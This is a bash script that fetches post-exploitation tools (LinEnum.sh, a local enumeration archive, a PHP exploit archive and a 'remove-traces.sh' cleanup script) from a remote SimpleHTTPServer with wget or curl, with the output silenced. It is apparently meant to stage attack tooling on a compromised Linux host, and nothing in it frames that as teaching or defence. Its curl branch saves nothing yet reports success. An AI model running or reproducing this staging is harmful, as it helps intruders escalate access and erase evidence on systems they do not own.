#!/bin/bash

#Get files from SimpleHTTPServer

FILES=( linux-local-enumeration-script.tar.gz remove-traces.sh LinEnum.sh php-exploit.tar.gz )
SERVER_IP=$1
INSTALLED_TOOL=""

if [[ ! $# -eq 1 ]]; then
	echo "Please supply a server IP address - e.g. 10.0.0.10:8000"
	exit 0
fi

if command -v wget &>/dev/null; then
	INSTALLED_TOOL="wget"	
elif command -v curl &>/dev/null; then
	INSTALLED_TOOL="curl"
else
	echo "Please add tool to obtain files from server."
	exit 0
fi

for file in ${FILES[@]}; do
	if [[ $INSTALLED_TOOL = "wget" ]]; then
		wget $SERVER_IP/$file &>/dev/null
		if [[ $? -eq 0 ]]; then
			echo "File: $file successfully copied"
		else
			echo "Unable to copy $file from $SERVER_IP"
		fi
	elif [[ $INSTALLED_TOOL = "curl" ]]; then
		curl $SERVER_IP/$file &>/dev/null
		if [[ $? -eq 0 ]]; then
			echo "File: $file successfully copied"
		else
			echo "Unable to copy $file from $SERVER_IP"
		fi
	fi
done
